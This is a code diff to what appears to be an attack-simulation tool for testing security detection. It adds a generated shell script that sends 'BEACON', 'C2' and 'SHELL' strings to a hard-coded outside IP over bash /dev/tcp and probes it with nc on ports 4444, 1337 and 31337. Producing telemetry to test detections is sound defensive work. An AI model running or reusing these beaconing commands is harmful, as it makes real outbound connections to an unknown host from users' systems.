@@ -1047,9 +1047,22 @@ impl AttackTechnique for UncommonRemoteShellCommands {
                 writeln!(log, "=== Executing: {cmd_name} ===")
                     .map_err(|e| format!("Failed to write to log file: {e}"))?;
 
-                // Create a simple shell script with the scary name
+                // Create a shell script with the scary name that attempts suspicious network activity
+                // Outbound connections to known bad ports generate network telemetry
                 let script_content = format!(
-                    "#!/bin/sh\necho 'SignalBench telemetry generator - {} executed'\necho 'Timestamp: {}'\necho 'User: {}'\n",
+                    r#"#!/bin/sh
+echo 'SignalBench telemetry generator - {} executed'
+echo 'Timestamp: {}'
+echo 'User: {}'
+# Outbound connection attempts to known bad ports (generates network telemetry)
+echo 'Attempting outbound connections to suspicious ports...'
+timeout 2 bash -c 'echo "BEACON" > /dev/tcp/198.135.184.22/4444' 2>/dev/null || true
+timeout 2 bash -c 'echo "C2" > /dev/tcp/198.135.184.22/1337' 2>/dev/null || true
+timeout 2 bash -c 'echo "SHELL" > /dev/tcp/198.135.184.22/31337' 2>/dev/null || true
+timeout 2 nc -zv 198.135.184.22 4444 2>&1 || true
+timeout 2 nc -zv 198.135.184.22 1337 2>&1 || true
+echo 'Network telemetry generation complete'
+"#,
                     cmd_name,
                     chrono::Local::now().to_rfc3339(),
                     whoami::username()
